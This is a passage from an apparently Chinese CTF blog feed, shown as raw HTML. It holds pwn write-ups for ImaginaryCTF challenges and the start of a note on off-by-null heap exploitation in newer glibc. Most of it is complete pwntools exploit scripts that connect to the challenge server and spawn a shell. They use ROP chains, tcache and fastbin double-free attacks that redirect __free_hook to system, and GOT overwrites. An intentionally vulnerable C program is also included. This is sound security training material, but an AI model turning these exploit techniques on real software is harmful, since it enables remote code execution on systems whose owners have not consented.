class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from libcfind import *</span><br><span class="line"></span><br><span class="line">elf&#x3D;&#39;.&#x2F;linonophobia&#39;</span><br><span class="line">e&#x3D;ELF(elf)</span><br><span class="line">context(arch&#x3D;e.arch,log_level&#x3D;&#39;debug&#39;)</span><br><span class="line">p&#x3D;remote(&#39;chal.imaginaryctf.org&#39;,42006)</span><br><span class="line">#p&#x3D;process(elf)</span><br><span class="line">#</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(&#39;1&#39;*8*31+&#39;2&#39;*8+&#39;3&#39;*0x8)</span><br><span class="line">p.recvline()</span><br><span class="line">#print(x)</span><br><span class="line">x&#x3D;p.recvline()[:7]</span><br><span class="line">print(len(x))</span><br><span class="line">print(x)</span><br><span class="line">addr&#x3D;u64(x.rjust(8,&#39;\x00&#39;))</span><br><span class="line"></span><br><span class="line">log.info(hex(addr))</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">pay&#x3D;&#39;1&#39;*8*31+&#39;2&#39;*8+&#39;3&#39;*0x8+p64(addr)</span><br><span class="line">print(hex(len(pay)))</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">0x000000000040086c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040086e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400870 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400872 : pop r15 ; ret</span><br><span class="line">0x000000000040086b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040086f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400638 : pop rbp ; ret</span><br><span class="line">0x0000000000400873 : pop rdi ; ret</span><br><span class="line">0x0000000000400871 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x000000000040086d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400566 : ret</span><br><span class="line">0x0000000000400769 : ret 0x8948</span><br><span class="line">0x0000000000400763 : ret 0xb60f</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">rdi_ret&#x3D;(0x0000000000400873 )</span><br><span class="line"></span><br><span class="line">p.sendline(&#39;1&#39;*8*31+&#39;2&#39;*8+&#39;3&#39;*0x8+p64(addr)+p64(0)+p64(rdi_ret)+p64(e.got[&#39;read&#39;])+p64(e.sym[&#39;puts&#39;])+p64(e.sym[&#39;main&#39;]))</span><br><span class="line">puts_addr&#x3D;u64(p.recvline()[:-1].ljust(8,&#39;\x00&#39;))</span><br><span class="line">log.info(hex(puts_addr))</span><br><span class="line">x&#x3D;finder(&#39;read&#39;,puts_addr,num&#x3D;1)</span><br><span class="line">p.sendline(&#39;1&#39;*8*31+&#39;2&#39;*8+&#39;3&#39;*0x8+p64(addr)+p64(0)+&#39;\x00&#39;*0x30)</span><br><span class="line"># rbx rbp r12 r13 r14 r15 </span><br><span class="line">def csu(g1,g2,buf,rbx,rbp,r12,r13,r14,r15,lest_cell):</span><br><span class="line">    pay&#x3D;p64(g1)+p64(0)</span><br><span class="line">    pay&#x3D;pay+p64(rbx)+p64(rbp)</span><br><span class="line">    pay&#x3D;pay+p64(r12)+p64(r13)+p64(r14)+p64(r15)</span><br><span class="line">    pay&#x3D;pay+p64(g2)</span><br><span class="line">    pay&#x3D;pay+&#39;\00&#39;*0x38+p64(lest_cell)</span><br><span class="line"></span><br><span class="line">    return pay</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(&#39;1&#39;*8*31+&#39;2&#39;*8+&#39;3&#39;*0x8+p64(addr)+p64(0)+p64(rdi_ret)+p64(0x000000000601060)+p64(x.dump(&#39;gets&#39;))+p64(rdi_ret)+p64(0x000000000601060)+p64(x.dump(&#39;system&#39;))+p64(e.sym[&#39;main&#39;]))</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.sendline(&#39;1&#39;)</span><br><span class="line">p.sendline(&#39;&#x2F;bin&#x2F;bash\x00&#39;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="memory-pile"><a href="#memory-pile" class="headerlink" title="memory_pile"></a>memory_pile</h2><p>常规2.27libc 的fast bin 二次释放题，劫持<code>__free_hook</code>写入system,来得到shall。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line">elf=<span class="string">'./memory_pile'</span></span><br><span class="line"></span><br><span class="line">e=ELF(elf)</span><br><span class="line">p=remote(<span class="string">'chal.imaginaryctf.org'</span>,<span class="number">42007</span>)</span><br><span class="line"><span class="comment">#p=process(elf)</span></span><br><span class="line">p.recvuntil(<span class="string">"I'll even give you a present, if you manage to unwrap it...\n"</span>)</span><br><span class="line">printf_addr=int(p.recvline(),<span class="number">16</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(num)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'With great power comes great responsibility &gt;'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(num)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'With great power comes great responsibility &gt;'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(num,text)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'With great power comes great responsibility &gt;'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line">    p.recvuntil(<span class="string">'Let me have it, boss &gt;'</span>)</span><br><span class="line">    p.sendline(text)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">'printf:'</span>+hex(printf_addr))</span><br><span class="line">x=finder(<span class="string">'printf'</span>,printf_addr)</span><br><span class="line">edit(<span class="number">0</span>,p64(x.dump(<span class="string">'__free_hook'</span>)))</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(x.dump(<span class="string">'system'</span>)))</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="stackoverflow"><a href="#stackoverflow" class="headerlink" title="stackoverflow"></a>stackoverflow</h2><p>rt，简单栈溢出。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./stackoverflow'</span>)</span><br><span class="line"><span class="comment">#p=process('./stackoverflow')</span></span><br><span class="line"><span class="comment">#db.attach(p)</span></span><br><span class="line">p=remote(<span class="string">'chal.imaginaryctf.org'</span>,<span class="number">42001</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>*<span class="number">8</span>*<span class="number">5</span>+p64(<span class="number">0x69637466</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="the-first-fit"><a href="#the-first-fit" class="headerlink" title="the_first_fit"></a>the_first_fit</h2><p>简单的uaf利用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> choice, choice2;</span><br><span class="line">  <span class="keyword">char</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">  <span class="keyword">char</span> *b;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"a is at %p\n"</span>, a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"b is at %p\n"</span>, b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"1: Malloc\n2: Free\n3: Fill a\n4: System b\n&gt; "</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;choice);</span><br><span class="line">    <span class="keyword">switch</span>(choice) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">"What do I malloc?\n(1) a\n(2) b\n&gt;&gt; "</span>);</span><br><span class="line">              <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;choice2);</span><br><span class="line">              <span class="keyword">if</span> (choice2 == <span class="number">1</span>)</span><br><span class="line">                a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">              <span class="keyword">else</span> <span class="keyword">if</span> (choice2 == <span class="number">2</span>)</span><br><span class="line">                b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">"What do I free?\n(1) a\n(2) b\n&gt;&gt; "</span>);</span><br><span class="line">              <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;choice2);</span><br><span class="line">              <span class="keyword">if</span> (choice2 == <span class="number">1</span>)</span><br><span class="line">                <span class="built_in">free</span>(a);</span><br><span class="line">              <span class="keyword">else</span> <span class="keyword">if</span> (choice2 == <span class="number">2</span>)</span><br><span class="line">                <span class="built_in">free</span>(b);</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>: <span class="built_in">printf</span>(<span class="string">"&gt;&gt; "</span>); <span class="built_in">scanf</span>(<span class="string">"%8s"</span>, a); <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>: system((<span class="keyword">char</span>*)b); <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>: <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="string-editor-1"><a href="#string-editor-1" class="headerlink" title="string_editor_1"></a>string_editor_1</h2><p>有意识的一道题，一次只能写入一个字符。但是由于存在数组下标越界，修改管理tetach，range 0x30 tache大于7且第一个的值向<code>__free_hook</code>附近（free_hook-0x20）.利用tache 优先级高于tache的特性，申请到free_hook-0x20的空间，在<code>__free_hook</code>写入<code>system</code>的地址，在free_hook-0x20写入<code>/bin/sh</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line">elf=<span class="string">'string_editor_1'</span></span><br><span class="line"></span><br><span class="line">e=ELF(elf)</span><br><span class="line">p=remote(<span class="string">'chal.imaginaryctf.org'</span>,<span class="number">42004</span>)</span><br><span class="line"><span class="comment">#process(elf)</span></span><br><span class="line">p.recvuntil(<span class="string">'But first, a word from our sponsors:'</span>)</span><br><span class="line">system_addr=int(p.recvline(),<span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">'system:'</span>+hex(system_addr))</span><br><span class="line">x=finder(<span class="string">'system'</span>,system_addr)</span><br><span class="line">free_hook=p64(x.dump(<span class="string">'__free_hook'</span>)<span class="number">-0x20</span>)</span><br><span class="line">p.sendline(str(<span class="number">-0x290</span>))</span><br><span class="line">p.sendline(<span class="string">'x'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(free_hook),<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">    </span><br><span class="line">    p.sendline(str(<span class="number">-0x211</span>+i))</span><br><span class="line">    p.sendline(free_hook[i<span class="number">-1</span>])</span><br><span class="line">p.sendline(<span class="string">'15'</span>)</span><br><span class="line">p.sendline(p8(<span class="number">0</span>))</span><br><span class="line">p.sendline(<span class="string">'14'</span>)</span><br><span class="line">p.sendline(p8(<span class="number">0</span>))</span><br><span class="line">system_addrs=p64(system_addr)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(system_addrs),<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">    </span><br><span class="line">    p.sendline(str(<span class="number">0x20</span>+i<span class="number">-1</span>))</span><br><span class="line">    p.sendline(system_addrs[i<span class="number">-1</span>])</span><br><span class="line">shall=<span class="string">'\x00/bin/sh\x00'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(shall),<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">    p.sendline(str(-i+<span class="number">8</span>))</span><br><span class="line">    p.sendline(shall[-i])</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="string-editor-2"><a href="#string-editor-2" class="headerlink" title="string_editor_2"></a>string_editor_2</h3><p>由于只能下溢出（负数），但能修改got表。修改strpy.got为pintf.got.plt.来通过格式化字符串泄露libcbase。</p><p>这里本地打通了，远程一直没打通，赛后专门看来dalao wp发现方法对的，可能是kali的原因（orw）。</p><p>想了个傻雕方法用<code>add-sysmbols</code>来猜与真实libcbase的差值 。</p><p>然后在修改strpy.got为system的真实地址，得到shell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line">elf=<span class="string">'./string_editor_2'</span></span><br><span class="line"><span class="comment">#0x601080</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">print(<span class="string">'__libc_start_main-l:'</span>+hex(libc.sym[<span class="string">'__libc_start_main'</span>]))</span><br><span class="line">LIBC=ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">print(<span class="string">'__libc_start_main-r:'</span>+hex(LIBC.sym[<span class="string">'__libc_start_main'</span>]))</span><br><span class="line">p=remote(<span class="string">'chal.imaginaryctf.org'</span>,<span class="number">42005</span>)</span><br><span class="line"><span class="comment">#p=process(elf)</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">shall='\x00/bin/sh\x00'</span></span><br><span class="line"><span class="string">for i in range(len(shall),-1,-1):</span></span><br><span class="line"><span class="string">    p.sendline(str(-i+8))</span></span><br><span class="line"><span class="string">    p.sendline(shall[-i])</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="comment">#864e50</span></span><br><span class="line">sys=p64(e.sym[<span class="string">'printf'</span>]).rjust(<span class="number">8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">print(sys)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(sys),<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">    p.sendline(str(<span class="number">-0x69</span>+i))</span><br><span class="line">    p.sendline(sys[i<span class="number">-1</span>])</span><br><span class="line">    p.recvuntil(<span class="string">'Done.'</span>)</span><br><span class="line">shall=<span class="string">'%13$p'</span></span><br><span class="line"><span class="comment">#shall='%16$p' #0x100000000</span></span><br><span class="line"><span class="comment">#shall='%13$p'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(shall),<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">    p.sendline(str(-i+<span class="number">8</span>))</span><br><span class="line">    p.sendline(shall[-i])</span><br><span class="line">    p.recvuntil(<span class="string">'Done.'</span>)</span><br><span class="line">p.sendline(str(<span class="number">15</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">'3. Exit\n'</span>)</span><br><span class="line">p.sendline(str(<span class="number">2</span>))</span><br><span class="line">p.recvuntil(<span class="string">'***'</span>)</span><br><span class="line"></span><br><span class="line">addr=int(p.recvuntil(<span class="string">'%'</span>)[:<span class="number">-1</span>],<span class="number">16</span>)<span class="number">-0x3f</span><span class="number">-0xb4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">print(hex(addr-LIBC.sym[<span class="string">'__libc_start_main'</span>]))</span><br><span class="line"></span><br><span class="line">x=finder(<span class="string">'__libc_start_main'</span>,addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sys=p64(x.dump(<span class="string">'system'</span>)).rjust(<span class="number">8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">print(sys)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(sys),<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">    p.sendline(str(<span class="number">-0x69</span>+i))</span><br><span class="line">    p.sendline(sys[i<span class="number">-1</span>])</span><br><span class="line">    p.recvuntil(<span class="string">'Done.'</span>)</span><br><span class="line">shall=<span class="string">'\x00\x00/bin/sh\x00'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(shall),<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">    p.sendline(str(-i+<span class="number">8</span>))</span><br><span class="line">    p.sendline(shall[-i])</span><br><span class="line">    p.recvuntil(<span class="string">'Done.'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#db.attach(p)</span></span><br><span class="line">p.sendline(str(<span class="number">15</span>))</span><br><span class="line">p.sendline(str(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;又一次感受到外国题那种雨露均沾的感觉，题目有简单，也有看不懂的（tcl）&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    
    <category term="wp" scheme="lexsd6.github.io/tags/wp/"/>
    
    <category term="pwn" scheme="lexsd6.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>高版本libc(2.29-2.32) off by null利用姿势笔记</title>
    <link href="lexsd6.github.io/2021/07/12/%E9%AB%98%E7%89%88%E6%9C%AClibc(2.29-2.32)%20off%20by%20null%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/"/>
    <id>lexsd6.github.io/2021/07/12/%E9%AB%98%E7%89%88%E6%9C%AClibc(2.29-2.32)%20off%20by%20null%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/</id>
    <published>2021-07-12T14:21:16.534Z</published>
    <updated>2021-09-16T05:42:00.524Z</updated>
    
    <content type="html"><![CDATA[<p>个人理解off by null 是 off by one的一种特例, off by null指我们可以控制堆块向下一个堆块溢出一个字节的数据，而该数据只能为’\x00’的情况。如果像常规off by one 是溢出任意一个字节，那么就可以修改下一个堆块的大小，而off by null则不能，它仅仅只可以将下一个堆块的inuse位置零.<a id="more"></a></p><h2 id="高版本libc改动影响"><a href="#高版本libc改动影响" class="headerlink" title="高版本libc改动影响"></a>高版本libc改动影响</h2><p>我们在2.29前 ,我们只需要按照下面来布局堆块:</p><p><img src="image-20210713000221116.png" alt="image-20210713000221116"></p><p>然后按照下面步骤:</p><ol><li>先释放chunk A.</li><li>通过chunk B,利用off by one漏洞在 修改chunk C presize 值为 chunk A size +chunk B size的同时,将chunk C的prev_inuse值覆盖为’\x00’.</li><li>再释放chunk C。</li></ol><p><img src="image-20210712235502736.png" alt="image-20210712235502736"></p><p>即可让chunk A B C 合并为一块大的chunk。</p><p> 但是在2.29后的libc在两个free chunk 进行合并前多一次对<code>prevsize</code>的值检查对应的源代码如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">  prevsize = prev_size (p);</span><br><span class="line">  <span class="built_in">size</span> += prevsize;</span><br><span class="line">  p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">    malloc_printerr (<span class="string">"corrupted size vs. prev_size while consolidating"</span>);</span><br><span class="line">  unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>导致我们如果按照上面所说的方法在<code>if (__glibc_unlikely (chunksize(p) != prevsize))</code>时,无法成功通过.因为此时<code>prevsize</code>为的<code>A size+ B size</code>但p的size仅仅为<code>A size</code>.</p><h2 id="爆破法"><a href="#爆破法" class="headerlink" title="爆破法"></a>爆破法</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>爆破法我借鉴的是nopnoping爷爷的思路：<a href="https://nopnoping.github.io/off-by-one%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">https://nopnoping.github.io/off-by-one%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/</a></p><p>爆破法的思路比较简单:</p><p>1.分配一个chunk ,将使下一块chunk地址的后三位抬高为<code>0x000</code>,并有机会出现后四位都是<code>0x0000</code>的情况.</p><p>2.分配一个范围大于tcache的最大值并且在largebin范围内的chunk A.</p><p>3.分配一个隔离chunk k.</p><p><img src="image-20210713163115172.png" alt="image-20210713163115172"></p><p>4.释放chunk A,在chunk A分配 chunk B,chunk C,chunkD,chunk F ,chunk E.要求chunk C 和chunk  D最好相邻且大小相同,同时让chunk B和 chunk D前14位相同,要求chunk F和chunk E 最好相邻.</p><p>5.释放chunk C 和chunk D 让其合并为smallbins,</p><p>6.分配chunk G 大小是让chunk G分配后,原chunk A 巧好剩下巧好空间H为chunk C +chunk  D的大小.</p><p>7.分配一个大的chunk,让原chunk A 剩下空间H加入smallbins.</p><p>8.重新分配chunk C,chunk D.让chunk C  bk 中addr为chunk D.同时修改其bk为 chunk B addr.</p><p>9.修改chunk B的bk为fake size，fd修改为chunk C addr .</p><p>10.先释放D再释放B，在分配回chunk B ,让原来chunk B fd 位置的值为chunk B addr</p><p>+0x10.</p><p>11.通过chunk F 修改 chunk E 的<code>prevsize</code>值为fake size，并覆盖E的prev_inuse值为0.</p><p> <img src="image-20210713175759641.png" alt="image-20210713175759641"></p><p>12.释放chunk E， B、C、D、F、E合并。</p><h3 id="例题-qwb-2021-baby-diary"><a href="#例题-qwb-2021-baby-diary" class="headerlink" title="例题:qwb_2021_baby_diary"></a>例题:qwb_2021_baby_diary</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 